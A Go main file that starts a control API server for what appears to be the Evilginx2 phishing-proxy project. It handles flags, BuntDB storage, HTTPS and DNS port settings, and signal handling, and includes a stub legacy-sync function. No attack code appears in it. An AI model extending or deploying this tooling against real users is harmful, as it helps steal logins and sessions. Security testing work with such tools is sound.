package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"

	"github.com/kgretzky/evilginx2/internal/api"
	"github.com/kgretzky/evilginx2/internal/storage"
	"github.com/kgretzky/evilginx2/pkg/models"
)

var (
	port    = flag.String("port", "8081", "API server port")
	dbPath  = flag.String("db", "./control.db", "Database file path")
	syncLegacy = flag.Bool("sync", false, "Sync data from legacy database")
	legacyDbPath = flag.String("legacy-db", "", "Path to legacy database file")
)

func main() {
	flag.Parse()

	fmt.Println("Starting Evilginx2 Control Service...")
	fmt.Printf("API Port: %s\n", *port)
	fmt.Printf("Database: %s\n", *dbPath)

	dbDir := filepath.Dir(*dbPath)
	if err := os.MkdirAll(dbDir, 0755); err != nil {
		log.Fatalf("Failed to create database directory: %v", err)
	}

	storage, err := storage.NewBuntDBStorage(*dbPath)
	if err != nil {
		log.Fatalf("Failed to initialize storage: %v", err)
	}
	defer storage.Close()

	config := &models.Config{
		General: models.GeneralConfig{
			HttpsPort: 443,
			DnsPort:   53,
		},
	}

	if *syncLegacy && *legacyDbPath != "" {
		fmt.Printf("Syncing data from legacy database: %s\n", *legacyDbPath)
		if err := syncFromLegacy(storage, *legacyDbPath); err != nil {
			log.Printf("Warning: Failed to sync legacy data: %v", err)
		}
	}

	server := api.NewServer(storage, config, *port)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go func() {
		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		<-sigChan
		fmt.Println("\nShutting down...")
		cancel()
	}()

	if err := server.Start(ctx); err != nil {
		log.Fatalf("Server failed: %v", err)
	}

	fmt.Println("Control service stopped")
}

func syncFromLegacy(storage storage.Interface, legacyDbPath string) error {
	fmt.Println("Legacy sync functionality would be implemented here")
	fmt.Printf("Would sync from: %s\n", legacyDbPath)
	return nil
}
